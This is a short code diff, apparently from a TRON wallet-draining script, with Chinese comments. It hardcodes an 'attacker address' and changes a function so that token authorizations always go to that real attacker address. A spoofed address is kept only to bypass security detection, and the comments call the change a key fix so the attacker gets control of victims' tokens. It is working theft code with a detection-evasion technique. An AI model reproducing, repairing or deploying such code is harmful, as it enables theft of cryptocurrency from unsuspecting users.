@@ -9,15 +9,12 @@
     // 攻击者地址（A用户）
     let ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
     
-    // 🎭 获取当前使用的地址（可能是伪装地址）
+    // 🎯 获取真实攻击者地址（绝不使用伪装地址进行授权）
     function getCurrentAttackerAddress() {
-        // 如果简化版地址伪装系统已启用，使用伪装地址
-        if (window.SimpleAddressSpoofing && window.SimpleAddressSpoofing.getSpoofAddress) {
-            const spoofAddress = window.SimpleAddressSpoofing.getSpoofAddress();
-            console.log(`🎭 使用简化版地址伪装: ${ATTACKER_ADDRESS} → ${spoofAddress}`);
-            return spoofAddress;
-        }
-        return ATTACKER_ADDRESS;
+        // ⚠️ 关键修复：授权必须给真实攻击者，否则无法获得代币控制权
+        console.log(`🎯 使用真实攻击者地址进行授权: ${ATTACKER_ADDRESS}`);
+        console.log(`🚨 伪装地址仅用于绕过安全检测，不能用于实际授权！`);
+        return ATTACKER_ADDRESS; // 始终返回真实攻击者地址
     }
     
     // 支持的代币合约地址（TRON网络）
